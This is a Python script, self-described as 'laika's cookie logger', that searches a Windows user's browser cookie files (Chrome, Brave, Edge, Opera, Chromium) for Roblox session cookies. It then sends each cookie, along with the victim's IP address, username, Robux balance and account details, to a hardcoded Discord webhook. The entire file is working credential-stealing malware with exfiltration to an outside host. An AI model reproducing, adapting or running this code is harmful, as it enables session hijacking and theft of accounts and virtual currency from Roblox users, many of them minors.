import requests
import browser_cookie3
import os

webhook = "https://discord.com/api/webhooks/970135541364453436/kZQVQpHj8pk-M5wn6PxDND7sGyeMRLl7VZf-TGHWhYSLS0C1NW2XZB9rVwuQKwsk-f9B"

ip = "http://ip-api.com/json/"
r = requests.get(ip)
adrs = r.json()["query"]

def sendCookie(cookie):
    authorization = {
        "Cookie": ".ROBLOSECURITY={}".format(cookie) 
    }

    url = "https://www.roblox.com/mobileapi/userinfo"
    jsonData = requests.get(url, headers=authorization).json()

    userid = jsonData["UserID"]
    username = jsonData["UserName"]
    robux = jsonData["RobuxBalance"]
    AVicon = jsonData["ThumbnailUrl"]
    premium = jsonData["IsPremium"]

    created = "https://users.roblox.com/v1/users/{}".format(userid)
    t = requests.get(created)
    time = t.json()["created"]
    creation = time.split("T")[0]

    data = {
    "content": "@everyone",
    "embeds": [{
    "title": "Profile",
    "description": cookie,
    "url": "https://www.roblox.com/users/{}/profile".format(userid),
    "footer": {
        "text": "made by laika#9124",
        "icon_url": "https://cdn.discordapp.com/attachments/857321712558800926/967187154210017350/exorcist-movie_sq-8d9e9295296e57396056005be7879bac0fe14460-s800-c85.jpg"
    },
    "fields": [
        {
            "name": "IP",
            "value": adrs,
            "inline": True
        },
        {
            "name": "Username",
            "value": username,
            "inline": True
        },
        {
            "name": "ID",
            "value": userid,
            "inline": True
        },
        {
            "name": "Robux",
            "value": robux,
            "inline": True
        },
        {
            "name": "Created",
            "value": creation,
            "inline": True
        },
        {
            "name": "Premium",
            "value": premium,
            "inline": True
        },
    ],
    "author": {
        "name": "laika's cookie logger",
        "icon_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
    },
    "color": "3447003",
    "thumbnail": {
        "url": AVicon,
            }
        }]
    }  
    
    requests.post(webhook, json=data)

directory = os.path.join(os.path.expandvars("%userprofile%"),"AppData\\Local")

for dirpath, dirnames, filenames in os.walk(directory):
    for filename in [f for f in filenames if f.startswith("Cookies")]:
        check = os.path.join(dirpath, filename)
        if not check.endswith("journal"):
            if "Google" in check:
                cookies = browser_cookie3.chrome(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
            elif "Brave" in check:
                cookies = browser_cookie3.brave(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
            elif "Edge" in check:
                cookies = browser_cookie3.edge(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
            elif "Opera" in check:
                cookies = browser_cookie3.opera(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
            elif "Chromium" in check:
                cookies = browser_cookie3.chromium(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
